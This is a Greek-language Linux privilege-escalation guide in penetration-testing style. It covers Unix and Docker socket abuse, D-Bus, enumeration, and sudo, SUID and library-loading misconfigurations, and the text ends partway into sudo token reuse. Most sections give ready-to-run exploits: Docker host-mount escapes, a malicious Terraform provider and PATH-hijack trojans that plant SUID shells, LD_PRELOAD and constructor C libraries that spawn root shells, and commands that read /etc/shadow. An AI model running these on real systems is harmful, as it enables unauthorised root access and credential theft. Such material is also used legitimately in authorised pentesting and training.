Unix Domain Sockets (UDS) επιτρέπουν την **επικοινωνία διεργασιών** στο ίδιο ή σε διαφορετικό μηχάνημα μέσα σε μοντέλα client-server. Χρησιμοποιούν τα τυπικά Unix descriptor αρχεία για επικοινωνία μεταξύ μηχανών και ρυθμίζονται μέσω `.socket` αρχείων.

Sockets μπορούν να ρυθμιστούν χρησιμοποιώντας `.socket` αρχεία.

**Learn more about sockets with `man systemd.socket`.** Μέσα σε αυτό το αρχείο, μπορούν να ρυθμιστούν διάφορες ενδιαφέρουσες παράμετροι:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Αυτές οι επιλογές είναι διαφορετικές αλλά συνοπτικά χρησιμοποιούνται για να **υποδείξουν πού θα ακούει** το socket (το path του αρχείου AF_UNIX socket, την IPv4/6 και/ή τον αριθμό θύρας για ακρόαση, κ.λπ.)
- `Accept`: Παίρνει ένα boolean όρισμα. Αν είναι **true**, δημιουργείται **ένα instance service για κάθε εισερχόμενη σύνδεση** και μόνο το connection socket περνιέται σε αυτό. Αν είναι **false**, όλα τα listening sockets **περνιούνται στη ξεκινώμενη service unit**, και μόνο μία service unit δημιουργείται για όλες τις συνδέσεις. Αυτή η τιμή αγνοείται για datagram sockets και FIFOs όπου μία ενιαία service unit χειρίζεται χωρίς όρους όλη την εισερχόμενη κυκλοφορία. **Defaults to false**. Για λόγους απόδοσης, συνιστάται οι νέοι daemons να γράφονται με τρόπο συμβατό με `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Παίρνουν μία ή περισσότερες γραμμές εντολών, οι οποίες **εκτελούνται πριν** ή **μετά** τα listening **sockets**/FIFOs **δημιουργηθούν** και δεσμευτούν, αντίστοιχα. Το πρώτο token της γραμμής εντολής πρέπει να είναι ένα απόλυτο filename, ακολουθούμενο από τα ορίσματα για τη διεργασία.
- `ExecStopPre`, `ExecStopPost`: Επιπλέον **εντολές** που **εκτελούνται πριν** ή **μετά** τα listening **sockets**/FIFOs **κλειστούν** και αφαιρεθούν, αντίστοιχα.
- `Service`: Καθορίζει το όνομα της **service** unit που θα **ενεργοποιηθεί** σε **εισερχόμενη κίνηση**. Αυτή η ρύθμιση επιτρέπεται μόνο για sockets με Accept=no. Προεπιλογή είναι η service που έχει το ίδιο όνομα με το socket (με αντικατεστημένο το κατάλληλο suffix). Στις περισσότερες περιπτώσεις δεν θα είναι απαραίτητο να χρησιμοποιήσετε αυτή την επιλογή.

### Writable .socket files

Αν βρείτε ένα **writable** `.socket` αρχείο μπορείτε να **προσθέσετε** στην αρχή της ενότητας `[Socket]` κάτι σαν: `ExecStartPre=/home/kali/sys/backdoor` και το backdoor θα εκτελεστεί πριν δημιουργηθεί το socket. Επομένως, **πιθανότατα θα χρειαστεί να περιμένετε μέχρι να γίνει reboot το μηχάνημα.**\
_Σημειώστε ότι το σύστημα πρέπει να χρησιμοποιεί αυτή τη διαμόρφωση του socket αρχείου αλλιώς το backdoor δεν θα εκτελεστεί_

### Writable sockets

Αν **εντοπίσετε κάποιο writable socket** (_τώρα μιλάμε για Unix Sockets και όχι για τα config `.socket` αρχεία_), τότε **μπορείτε να επικοινωνήσετε** με αυτό το socket και ίσως να exploit-άρετε μια ευπάθεια.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Ακατέργαστη σύνδεση
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Σημειώστε ότι μπορεί να υπάρχουν μερικά **sockets listening for HTTP** requests (_Δεν αναφέρομαι στα .socket files αλλά στα αρχεία που λειτουργούν ως unix sockets_). Μπορείτε να το ελέγξετε με:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Εάν το socket **απαντά σε ένα HTTP** αίτημα, τότε μπορείτε να **επικοινωνήσετε** μαζί του και ίσως να **εκμεταλλευτείτε κάποια ευπάθεια**.

### Εγγράψιμο Docker socket

Το Docker socket, που συχνά βρίσκεται στο `/var/run/docker.sock`, είναι ένα κρίσιμο αρχείο που πρέπει να ασφαλιστεί. Από προεπιλογή, είναι εγγράψιμο από τον χρήστη `root` και τα μέλη της ομάδας `docker`. Η κατοχή δικαιώματος εγγραφής σε αυτό το socket μπορεί να οδηγήσει σε privilege escalation. Παρακάτω παρουσιάζεται ανάλυση του πώς μπορεί να γίνει αυτό και εναλλακτικές μέθοδοι εάν το Docker CLI δεν είναι διαθέσιμο.

#### **Privilege Escalation with Docker CLI**

Αν έχετε δικαίωμα εγγραφής στο Docker socket, μπορείτε να escalate privileges χρησιμοποιώντας τις ακόλουθες εντολές:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Αυτές οι εντολές σας επιτρέπουν να εκτελέσετε ένα container με πρόσβαση root στο σύστημα αρχείων του host.

#### **Using Docker API Directly**

Σε περιπτώσεις όπου το Docker CLI δεν είναι διαθέσιμο, το Docker socket μπορεί ακόμα να χειριστεί χρησιμοποιώντας το Docker API και εντολές `curl`.

1.  **List Docker Images:** Ανάκτηση της λίστας των διαθέσιμων images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Στείλτε ένα αίτημα για να δημιουργήσετε ένα container που κάνει mount τον root κατάλογο του host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Χρησιμοποιήστε `socat` για να καθιερώσετε μια σύνδεση στο container, επιτρέποντας την εκτέλεση εντολών μέσα σε αυτό.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Μετά τη ρύθμιση της σύνδεσης `socat`, μπορείτε να εκτελείτε εντολές απευθείας στο container με πρόσβαση root στο σύστημα αρχείων του host.

### Others

Σημειώστε ότι αν έχετε δικαιώματα εγγραφής στο docker socket επειδή είστε **μέλος της ομάδας `docker`** έχετε [**περισσότερους τρόπους για να ανεβάσετε προνόμια**](interesting-groups-linux-pe/index.html#docker-group). Εάν το [**docker API ακούει σε μια θύρα** μπορείτε επίσης να το καταστρέψετε/εκμεταλλευτείτε](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Ελέγξτε **περισσότερους τρόπους για να ξεφύγετε από το docker ή να το καταχραστείτε για ανύψωση προνομίων** σε:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) ανύψωση προνομίων

Αν διαπιστώσετε ότι μπορείτε να χρησιμοποιήσετε την εντολή **`ctr`**, διαβάστε την παρακάτω σελίδα καθώς **μπορεί να μπορείτε να την εκμεταλλευτείτε για ανύψωση προνομίων**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** ανύψωση προνομίων

Αν διαπιστώσετε ότι μπορείτε να χρησιμοποιήσετε την εντολή **`runc`** διαβάστε την παρακάτω σελίδα καθώς **μπορεί να μπορείτε να την εκμεταλλευτείτε για ανύψωση προνομίων**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

Το D-Bus είναι ένα εξελιγμένο σύστημα **inter-Process Communication (IPC)** που επιτρέπει στις εφαρμογές να αλληλεπιδρούν και να μοιράζονται δεδομένα αποτελεσματικά. Σχεδιασμένο με γνώμονα το σύγχρονο Linux σύστημα, προσφέρει ένα στιβαρό πλαίσιο για διάφορες μορφές επικοινωνίας μεταξύ εφαρμογών.

Το σύστημα είναι ευέλικτο, υποστηρίζοντας βασικό IPC που βελτιώνει την ανταλλαγή δεδομένων μεταξύ διεργασιών, θυμίζοντας **enhanced UNIX domain sockets**. Επιπλέον, βοηθά στην εκπομπή γεγονότων ή σημάτων, προωθώντας ομαλή ενσωμάτωση μεταξύ συστημικών συνιστωσών. Για παράδειγμα, ένα σήμα από ένα Bluetooth daemon για εισερχόμενη κλήση μπορεί να προκαλέσει ένα music player να σιγήσει, βελτιώνοντας την εμπειρία χρήστη. Επιπλέον, το D-Bus υποστηρίζει ένα remote object σύστημα, απλοποιώντας αιτήσεις υπηρεσιών και κλήσεις μεθόδων μεταξύ εφαρμογών, εξορθολογίζοντας διαδικασίες που παραδοσιακά ήταν περίπλοκες.

Το D-Bus λειτουργεί με ένα μοντέλο **allow/deny**, διαχειριζόμενο τα δικαιώματα μηνυμάτων (κλήσεις μεθόδων, εκπομπές σημάτων κ.λπ.) βασισμένο στο συνολικό αποτέλεσμα των κανόνων πολιτικής που ταιριάζουν. Αυτές οι πολιτικές καθορίζουν τις αλληλεπιδράσεις με το bus, και ενδέχεται να επιτρέψουν ανύψωση προνομίων μέσω της εκμετάλλευσης αυτών των δικαιωμάτων.

Παρατίθεται ένα παράδειγμα τέτοιας πολιτικής στο `/etc/dbus-1/system.d/wpa_supplicant.conf`, που περιγράφει τα δικαιώματα για τον χρήστη root να έχει, να στέλνει προς, και να λαμβάνει μηνύματα από το `fi.w1.wpa_supplicant1`.

Οι πολιτικές χωρίς καθορισμένο χρήστη ή ομάδα ισχύουν καθολικά, ενώ οι πολιτικές στο πλαίσιο "default" εφαρμόζονται σε όλους όσους δεν καλύπτονται από άλλες συγκεκριμένες πολιτικές.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Μάθετε πώς να enumerate και να exploit μια επικοινωνία D-Bus εδώ:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Δίκτυο**

Είναι πάντα ενδιαφέρον να enumerate το δίκτυο και να προσδιορίσετε τη θέση του μηχανήματος.

### Γενική enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Ανοιχτές θύρες

Ελέγξτε πάντα τις υπηρεσίες δικτύου που τρέχουν στο μηχάνημα και με τις οποίες δεν μπορέσατε να αλληλεπιδράσετε πριν αποκτήσετε πρόσβαση σε αυτό:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Ελέγξτε αν μπορείτε να sniff traffic. Αν μπορείτε, θα μπορούσατε να grab κάποια credentials.
```
timeout 1 tcpdump
```
## Χρήστες

### Γενική Καταγραφή

Δείτε **ποιος** είστε, ποια **δικαιώματα** έχετε, ποιοι **χρήστες** υπάρχουν στα συστήματα, ποιοι μπορούν να **login** και ποιοι έχουν **root δικαιώματα:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Κάποιες εκδόσεις του Linux επηρεάστηκαν από ένα σφάλμα που επιτρέπει σε χρήστες με **UID > INT_MAX** να αποκτήσουν αναβαθμισμένα δικαιώματα. Περισσότερες πληροφορίες: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Εκμεταλλευτείτε το** χρησιμοποιώντας: **`systemd-run -t /bin/bash`**

### Groups

Ελέγξτε αν είστε **μέλος κάποιας ομάδας** που θα μπορούσε να σας δώσει προνόμια root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Ελέγξτε αν υπάρχει κάτι ενδιαφέρον μέσα στο πρόχειρο (αν είναι δυνατόν)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Πολιτική Κωδικών Πρόσβασης
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Γνωστοί κωδικοί πρόσβασης

Αν **γνωρίζετε κάποιον κωδικό** του περιβάλλοντος, **δοκιμάστε να συνδεθείτε ως κάθε χρήστης** χρησιμοποιώντας τον.

### Su Brute

Αν δεν σας πειράζει να προκαλέσετε πολύ θόρυβο και τα δυαδικά `su` και `timeout` είναι παρόντα στον υπολογιστή, μπορείτε να δοκιμάσετε να κάνετε brute-force σε χρήστες χρησιμοποιώντας [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) με την παράμετρο `-a` δοκιμάζει επίσης brute-force σε χρήστες.

## Καταχρήσεις εγγράψιμου $PATH

### $PATH

Αν διαπιστώσετε ότι μπορείτε να **γράψετε σε κάποιο φάκελο του $PATH**, ίσως να μπορείτε να ανεβάσετε προνόμια δημιουργώντας **ένα backdoor μέσα στο εγγράψιμο φάκελο** με το όνομα κάποιας εντολής που πρόκειται να εκτελεστεί από διαφορετικό χρήστη (ιδανικά root) και που **δεν φορτώνεται από φάκελο που βρίσκεται πριν** από τον εγγράψιμο φάκελό σας στο $PATH.

### SUDO και SUID

Μπορεί να σας επιτρέπεται να εκτελέσετε κάποια εντολή χρησιμοποιώντας sudo ή κάποια αρχεία μπορεί να έχουν το suid bit. Ελέγξτε το χρησιμοποιώντας:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Ορισμένες **απροσδόκητες εντολές σας επιτρέπουν να διαβάζετε και/ή να γράφετε αρχεία ή ακόμη και να εκτελέσετε μια εντολή.** Για παράδειγμα:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Η ρύθμιση του sudo μπορεί να επιτρέψει σε έναν χρήστη να εκτελέσει κάποια εντολή με τα προνόμια άλλου χρήστη χωρίς να γνωρίζει τον κωδικό πρόσβασης.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Σε αυτό το παράδειγμα ο χρήστης `demo` μπορεί να εκτελέσει το `vim` ως `root`, οπότε είναι απλό να αποκτήσει κανείς ένα shell προσθέτοντας ένα ssh key στον root directory ή καλώντας το `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Αυτή η οδηγία επιτρέπει στον χρήστη να **ορίσει μια μεταβλητή περιβάλλοντος** ενώ εκτελεί κάτι:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Αυτό το παράδειγμα, **βασισμένο στη μηχανή HTB Admirer**, ήταν **ευάλωτο** σε **PYTHONPATH hijacking** για να φορτώσει μια αυθαίρετη python βιβλιοθήκη κατά την εκτέλεση του script ως root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV διατηρείται μέσω sudo env_keep → root shell

Εάν sudoers διατηρεί το `BASH_ENV` (π.χ. `Defaults env_keep+="ENV BASH_ENV"`), μπορείτε να αξιοποιήσετε τη μη-διαδραστική συμπεριφορά εκκίνησης του Bash για να εκτελέσετε αυθαίρετο κώδικα ως root όταν καλείτε μια επιτρεπτή εντολή.

- Γιατί λειτουργεί: Για μη-διαδραστικά shells, το Bash αξιολογεί το `$BASH_ENV` και κάνει source εκείνο το αρχείο πριν τρέξει το στοχευόμενο script. Πολλοί κανόνες sudo επιτρέπουν την εκτέλεση ενός script ή ενός shell wrapper. Εάν το `BASH_ENV` διατηρείται από το sudo, το αρχείο σας γίνεται source με δικαιώματα root.

- Απαιτήσεις:
- Ένας sudo κανόνας που μπορείτε να εκτελέσετε (οποιοσδήποτε στόχος που καλεί `/bin/bash` μη-διαδραστικά, ή οποιοδήποτε bash script).
- Το `BASH_ENV` να υπάρχει στο `env_keep` (ελέγξτε με `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Σκληροποίηση:
- Αφαίρεσε `BASH_ENV` (και `ENV`) από `env_keep`, προτίμησε `env_reset`.
- Απόφυγε shell wrappers για sudo-allowed commands; χρησιμοποίησε minimal binaries.
- Εξέτασε το sudo I/O logging και ειδοποίηση όταν χρησιμοποιούνται preserved env vars.

### Terraform μέσω sudo με διατηρημένο HOME (!env_reset)

Εάν το sudo αφήνει το περιβάλλον ανέπαφο (`!env_reset`) ενώ επιτρέπει το `terraform apply`, το `$HOME` παραμένει ως του καλούντος χρήστη. Το Terraform επομένως φορτώνει **$HOME/.terraformrc** ως root και σέβεται το `provider_installation.dev_overrides`.

- Κατεύθυνε τον απαιτούμενο provider σε έναν κατάλογο με δικαιώματα εγγραφής και τοποθέτησε ένα κακόβουλο plugin με το όνομα του provider (π.χ. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Το Terraform θα αποτύχει στο Go plugin handshake αλλά θα εκτελέσει το payload ως root πριν τερματίσει, αφήνοντας πίσω ένα SUID shell.

### TF_VAR overrides + παράκαμψη επικύρωσης για symlink

Οι μεταβλητές του Terraform μπορούν να παρέχονται μέσω των μεταβλητών περιβάλλοντος `TF_VAR_<name>`, οι οποίες επιβιώνουν όταν το sudo διατηρεί το περιβάλλον. Αδύναμες επικυρώσεις όπως `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` μπορούν να παρακαμφθούν με symlinks:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Το Terraform επιλύει το symlink και αντιγράφει το πραγματικό `/root/root.txt` σε attacker-readable προορισμό. Η ίδια προσέγγιση μπορεί να χρησιμοποιηθεί για να **γράψετε** σε προνομιούχες διαδρομές δημιουργώντας εκ των προτέρων προοριστικά symlinks (π.χ., δείχνοντας το provider’s destination path μέσα στο `/etc/cron.d/`).

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Αν το `sudo -l` εμφανίζει `env_keep+=PATH` ή ένα `secure_path` που περιέχει attacker-writable καταχωρήσεις (π.χ., `/home/<user>/bin`), οποιαδήποτε σχετική εντολή μέσα στον sudo-allowed στόχο μπορεί να γίνει shadowed.

- Απαιτήσεις: ένας sudo κανόνας (συνήθως `NOPASSWD`) που τρέχει ένα script/binary που καλεί εντολές χωρίς απόλυτες διαδρομές (`free`, `df`, `ps`, κ.λπ.) και μια εγγράψιμη καταχώρηση PATH που αναζητείται πρώτη.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Παρακάμπτοντας μονοπάτια εκτέλεσης του Sudo
**Μεταβείτε** για να διαβάσετε άλλα αρχεία ή χρησιμοποιήστε **symlinks**. Για παράδειγμα στο sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Αν χρησιμοποιηθεί ένα **wildcard** (\*), είναι ακόμα πιο εύκολο:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Αντιμέτρα**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary χωρίς καθορισμένο μονοπάτι

Εάν η **άδεια sudo** έχει δοθεί για μια μεμονωμένη εντολή **χωρίς να καθοριστεί το μονοπάτι**: _hacker10 ALL= (root) less_ μπορείτε να το εκμεταλλευτείτε αλλάζοντας τη μεταβλητή PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Αυτή η τεχνική μπορεί επίσης να χρησιμοποιηθεί εάν ένα **suid** binary **εκτελεί άλλη εντολή χωρίς να καθορίζει τη διαδρομή προς αυτήν (πάντα ελέγξτε με** _**strings**_ **το περιεχόμενο ενός περίεργου SUID binary)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary με καθορισμένη διαδρομή εντολής

Εάν το **suid** binary **εκτελεί άλλη εντολή καθορίζοντας τη διαδρομή**, τότε μπορείτε να δοκιμάσετε να **export a function** με το όνομα της εντολής που καλεί το αρχείο suid.

Για παράδειγμα, αν ένα suid binary καλεί _**/usr/sbin/service apache2 start**_, πρέπει να προσπαθήσετε να δημιουργήσετε τη function και να την export:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Τότε, όταν καλέσετε το suid binary, αυτή η συνάρτηση θα εκτελεστεί

### LD_PRELOAD & **LD_LIBRARY_PATH**

Η μεταβλητή περιβάλλοντος **LD_PRELOAD** χρησιμοποιείται για να καθορίσει μία ή περισσότερες shared libraries (.so αρχεία) που θα φορτωθούν από τον loader πριν από όλες τις υπόλοιπες, συμπεριλαμβανομένης της standard C library (`libc.so`). Αυτή η διαδικασία είναι γνωστή ως preloading μιας βιβλιοθήκης.

Ωστόσο, για να διατηρηθεί η ασφάλεια του συστήματος και να αποτραπεί η εκμετάλλευση αυτής της δυνατότητας, ιδιαίτερα με εκτελέσιμα αρχεία **suid/sgid**, το σύστημα επιβάλλει ορισμένες προϋποθέσεις:

- Ο loader αγνοεί **LD_PRELOAD** για εκτελέσιμα όπου το πραγματικό user ID (_ruid_) δεν ταιριάζει με το effective user ID (_euid_).
- Για εκτελέσιμα με suid/sgid, μόνο βιβλιοθήκες σε standard paths που επίσης είναι suid/sgid προφορτώνονται.

Privilege escalation μπορεί να προκύψει εάν έχετε τη δυνατότητα να εκτελείτε εντολές με `sudo` και η έξοδος του `sudo -l` περιλαμβάνει τη δήλωση **env_keep+=LD_PRELOAD**. Αυτή η ρύθμιση επιτρέπει στη μεταβλητή περιβάλλοντος **LD_PRELOAD** να παραμένει και να αναγνωρίζεται ακόμη και όταν οι εντολές εκτελούνται με `sudo`, ενδεχόμενα οδηγώντας στην εκτέλεση αυθαίρετου κώδικα με αυξημένα προνόμια.
```
Defaults        env_keep += LD_PRELOAD
```
Αποθηκεύστε ως **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Στη συνέχεια **μεταγλωττίστε το** χρησιμοποιώντας:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Τέλος, **escalate privileges** εκτελώντας
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Μια παρόμοια privesc μπορεί να καταχραστεί αν ο attacker ελέγχει την env variable **LD_LIBRARY_PATH**, επειδή ελέγχει τη διαδρομή όπου θα αναζητηθούν οι libraries.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Όταν συναντάτε ένα binary με **SUID** δικαιώματα που φαίνεται ασυνήθιστο, είναι καλή πρακτική να ελέγχετε αν φορτώνει σωστά αρχεία **.so**. Αυτό μπορεί να ελεγχθεί εκτελώντας την ακόλουθη εντολή:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Για παράδειγμα, η εμφάνιση σφάλματος όπως _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ υποδηλώνει πιθανότητα εκμετάλλευσης.

Για να το εκμεταλλευτείτε, θα προχωρούσατε δημιουργώντας ένα αρχείο C, π.χ. _"/path/to/.config/libcalc.c"_, που περιέχει τον ακόλουθο κώδικα:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Αυτός ο κώδικας, μόλις μεταγλωττιστεί και εκτελεστεί, στοχεύει στην ανύψωση των privileges με την τροποποίηση των δικαιωμάτων αρχείων και την εκτέλεση ενός shell με αυξημένα privileges.

Μεταγλωττίστε το παραπάνω αρχείο C σε shared object (.so) με:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Τέλος, η εκτέλεση του επηρεασμένου SUID binary θα πρέπει να ενεργοποιήσει το exploit, επιτρέποντας πιθανό συμβιβασμό του συστήματος.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Τώρα που έχουμε βρει ένα SUID binary που φορτώνει μια library από έναν φάκελο όπου μπορούμε να γράψουμε, ας δημιουργήσουμε τη library σε αυτόν τον φάκελο με το απαραίτητο όνομα:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Εάν λάβετε ένα σφάλμα όπως
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
αυτό σημαίνει ότι η βιβλιοθήκη που έχετε δημιουργήσει πρέπει να έχει μια συνάρτηση με όνομα `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) είναι μια επιμελημένη λίστα Unix binaries που μπορούν να εκμεταλλευτούν επιτιθέμενοι για να παρακάμψουν τοπικούς περιορισμούς ασφαλείας. [**GTFOArgs**](https://gtfoargs.github.io/) είναι το ίδιο αλλά για περιπτώσεις όπου μπορείτε **μόνο να εισάγετε ορίσματα** σε μια εντολή.

Το έργο συλλέγει νόμιμες λειτουργίες των Unix binaries που μπορούν να καταχραστούν για να διαφύγουν από περιορισμένα shells, να αυξήσουν ή να διατηρήσουν αυξημένα προνόμια, να μεταφέρουν αρχεία, να δημιουργήσουν bind και reverse shells, και να διευκολύνουν άλλες εργασίες post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Αν μπορείτε να εκτελέσετε `sudo -l` μπορείτε να χρησιμοποιήσετε το εργαλείο [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) για να ελέγξετε αν βρίσκει τρόπο να εκμεταλλευτεί κάποιον κανόνα του sudo.

### Επαναχρησιμοποίηση Sudo Tokens

Σε περιπτώσεις όπου έχετε **sudo access** αλλά όχι τον κωδικό, μπορείτε να αυξήσετε τα προνόμια περιμένοντας την εκτέλεση μίας εντολής sudo και στη συνέχεια καταλαμβάνοντας το session token.

